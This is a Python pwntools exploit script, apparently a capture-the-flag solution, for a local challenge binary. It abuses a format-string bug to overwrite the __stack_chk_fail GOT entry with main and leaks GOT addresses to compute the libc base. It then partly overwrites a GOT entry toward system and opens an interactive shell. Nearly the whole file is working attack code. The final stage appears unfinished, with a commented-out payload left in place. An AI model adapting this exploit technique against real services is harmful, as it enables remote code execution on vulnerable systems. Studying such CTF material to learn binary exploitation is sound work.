#!/usr/bin/python3
from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9999

gs = """
# b *main
continue
"""

context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def main():
    global io
    io = start()

    payload_len = 4*16+8+1
    payload = f"%{(elf.sym.main) & 0xffff}c%10$hn|%11$s|%12$s|%19$p|".encode()
    payload = payload.ljust(0x20, b"A")  # 6-9
    payload += p64(elf.got.__stack_chk_fail)  # 10
    payload += p64(elf.got.read)  # 11
    payload += p64(elf.got.printf)  # 12
    # We will overwrite __stack_chk_fail with main,
    # 1 byte overflow to change stack canary,
    # which will call __stack_chk_fail
    payload = payload.ljust(payload_len, b"A")
    io.sendlineafter(b"? ", payload)

    # LIBC LEAK
    leaks = io.clean().split(b"|")
    read, printf, stack_leak = u64(leaks[1].ljust(8, b"\x00")), u64(
        leaks[2].ljust(8, b"\x00")), eval(leaks[3])
    log.info(f"read: {hex(read)}")
    log.info(f"printf: {hex(printf)}")
    log.info(f"stack_leak: {hex(stack_leak)}")

    ret_addr = stack_leak - 0x150
    libc.address = read - libc.sym.read
    log.info(f"libc: {hex(libc.address)}")
    log.info(f"ret_addr: {hex(ret_addr)}")

    # then run "pwninit --bin chall --no-template"

    # overwrite system -> printf
    # system: 0x7f922b4d9290
    # printf: 0x7f922b4e8c90
    log.info(f"system: {hex(libc.sym.system)}")
    write_vals = [(libc.sym.system >> 16) & 0xff, libc.sym.system & 0xffff]
    payload = f"%{write_vals[0]}c%12$hhn".encode()
    assert len(payload) <= 0x30
    payload = payload.ljust(0x30, b"A")  # 6-11
    payload += p64(0x404060)  # 12
    payload = payload.ljust(payload_len, b"A")
    print(payload)
    io.sendline(payload)
    # payload = b""
    # payload = payload.ljust(payload_len, b"\x00")
    # io.sendline(payload)

    io.interactive()


if __name__ == "__main__":
    main()
